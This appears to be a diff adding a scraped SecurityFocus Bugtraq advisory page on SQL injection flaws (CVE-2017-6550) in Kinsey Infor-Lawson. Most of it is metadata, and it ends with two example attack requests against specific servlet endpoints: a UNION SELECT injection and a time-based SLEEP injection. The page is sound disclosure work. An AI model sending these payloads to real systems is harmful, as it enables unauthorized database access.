@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid96821<p><b><span style="font-size: 18pt;">Kinsey Infor-Lawson CVE-2017-6550 Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/96821/info">info</a><br><a href="http://www.securityfocus.com/bid/96821/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/96821/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/96821/solution">solution</a><br><a href="http://www.securityfocus.com/bid/96821/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				96821
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2017-6550<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 10 2017 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 16 2017 12:02AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Michael Benich
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Kinsey Infor-Lawson  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example requests are available:<br/><br/>1. GET /esbus/servlet/GetSQLData?SCHEMA=ESBUS_INTERNAL&amp;amp;TABLE=SCHEDULEDTASKS UNION ALL SELECT &amp;lt;&amp;lt;ATTACKER <br/>INPUT&amp;gt;&amp;gt;&amp;amp;FIELD=LASTRUN&amp;amp;NOHEADER=1&amp;amp;SELECT=CLASS=com.esbus.appliance.SOD_PolicyCheck_SystemRun_TimerTask&amp;amp;OUT=XML HTTP/1.1<br/><br/>2. POST /KK_LS9ReportingPortal/GetData?SERVERID=%27;LSF_PROD&amp;amp; HTTP/1.1<br/><br/>&amp;lt;--snip--http headers--&amp;gt;<br/><br/>QUERY=1 AND SLEEP(5) AND ('foo'='foo')) &amp;amp;OUT=TAB
+	
+		<ul>
+</ul>
+</div>
